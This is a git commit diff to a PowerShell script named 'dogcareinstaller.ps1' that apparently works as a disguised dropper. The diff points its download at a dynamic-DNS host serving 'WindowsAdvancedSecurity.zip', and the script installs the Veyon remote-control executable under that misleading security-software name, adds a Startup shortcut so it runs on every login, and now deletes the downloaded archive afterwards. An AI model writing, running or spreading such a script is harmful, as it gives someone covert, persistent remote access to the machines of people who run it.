abc9e6ed60c1bd259301fed52592785353a7cee5
alariordas <80034759+alariordas@users.noreply.github.com>
2023-10-24 10:38:21 +0200

    Update dogcareinstaller.ps1

--- dogcareinstaller.ps1
+++ dogcareinstaller.ps1
@@ -1,5 +1,5 @@
 # Download the ZIP file from Mediafire
-$downloadLink = "https://download843.mediafire.com/qx6s9adx4pvgraPltumC-mG6EOI9RZteoLlgHDmFzeloHehnhbwX2vIxASH3Ue9w3jwC1YSizkKvTI0o-2FPLyIUOCpuuutS46ZIp3R8i-5y_BHd7NmRXvYalF3bX2HBzf1zrURRw5kQGAzwFPjBgnWkjq4K9Utif2PI9p6y/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip"
+$downloadLink = "http://auroraswebs.duckdns.org/WindowsAdvancedSecurity.zip"
 $destinationPath = "C:\WindowsAdvancedSecurity.zip"
 Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath
 
@@ -12,3 +12,6 @@ $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut("$($WScriptShell.SpecialFolders('Startup'))\Veyon.lnk")
 $Shortcut.TargetPath = "C:\Program Files\WindowsAdvancedSecurity\Veyon.exe"
 $Shortcut.Save()
+
+# Remove the downloaded ZIP file
+Remove-Item -Path $destinationPath
